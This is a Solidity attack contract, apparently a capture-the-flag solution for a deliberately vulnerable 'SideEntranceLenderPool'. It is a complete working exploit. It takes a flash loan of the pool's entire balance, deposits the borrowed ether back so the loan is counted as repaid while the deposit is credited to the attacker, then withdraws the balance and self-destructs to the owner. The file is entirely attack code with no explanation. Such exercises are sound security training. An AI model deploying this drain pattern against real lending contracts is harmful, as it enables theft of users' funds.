pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract AttackSideEntranceLenderPool {
    using SafeMath for uint256;
    using Address for address;

    SideEntranceLenderPool public pool;
    address payable private owner;

    modifier onlyPool() {
        require(msg.sender == address(pool));
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor (address _pool) public {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function execute() external payable onlyPool {
        uint256 totalBalance = address(this).balance;
        pool.deposit{value:address(this).balance}();
    }

    function destroy() external onlyOwner {
        pool.withdraw();
        selfdestruct(owner);
    }

    function attack() external onlyOwner {
        uint256 totalBalance = address(pool).balance;
        pool.flashLoan(totalBalance);
    }

    // Allow deposits of ETH
    receive () external payable {}
}
